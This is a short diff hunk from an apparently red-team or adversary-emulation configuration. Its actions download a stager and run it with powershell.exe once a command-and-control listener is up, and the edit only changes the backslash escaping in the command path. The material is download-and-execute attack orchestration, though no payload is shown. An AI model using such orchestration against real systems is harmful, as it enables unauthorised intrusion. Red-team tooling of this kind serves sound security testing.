@@ -216,7 +216,7 @@ action "task_download_file" "download_stager" {
 action "task_execute_command" "execute_stager" {
     depends_on  = resource.listener.c2_listener.listener_name
     task_name   = data.tasks.initial_access_task.task_name
-    command     = "powershell.exe arsenal\\${action.task_download_file.download_stager.file_name}"
+    command     = "powershell.exe arsenal\${action.task_download_file.download_stager.file_name}"
 
     action_function {
         wait_for_c2 {
